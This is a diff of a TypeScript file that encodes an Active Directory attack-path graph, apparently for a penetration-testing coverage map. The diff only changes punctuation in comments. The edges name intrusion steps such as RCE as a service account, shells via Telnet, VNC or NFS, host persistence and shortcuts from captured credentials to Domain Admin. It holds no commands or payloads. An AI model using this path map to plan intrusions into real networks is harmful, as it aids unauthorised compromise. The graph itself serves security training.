   // App/web RCE lands you as the app-pool / service identity (often a low-priv or
-  // domain service account) — NOT necessarily local admin. Route through the
+  // domain service account). NOT necessarily local admin. Route through the
   // user-context foothold; a direct SYSTEM only when the app runs as LocalSystem
   // (Jenkins/Splunk/Tomcat services often do).
   { source: 'internal-web-apps', target: 'user-foothold', label: 'RCE as the app / service account', rel: 'host-exec' },
@@ -1052,10 +1052,10 @@ export const adCoverageEdges: AttackEdge[] = [
   { source: 'network-recon', target: 'weak-services' },
   { source: 'weak-services', target: 'valid-domain-creds', label: 'looted creds / data' },
   { source: 'weak-services', target: 'user-foothold', label: 'shell via Telnet / VNC / NFS' },
-  // Host-local persistence — maintain a foothold (CRTO "Host Persistence"); terminal
+  // Host-local persistence: maintain a foothold (CRTO "Host Persistence"); terminal
   { source: 'local-admin-host', target: 'host-persistence', label: 'maintain access' },
 
-  // Any captured credential / ticket / token can belong to a Domain Admin — so the
+  // Any captured credential / ticket / token can belong to a Domain Admin, so the
   // credential-capture nodes each carry a (conditional) SHORTCUT straight to DA. A
   // privileged user logged on / their secret stored here = instant Domain Admin.
   // The creds you ALREADY hold can be a DA's too (sprayed/cracked/relayed/kerberoasted
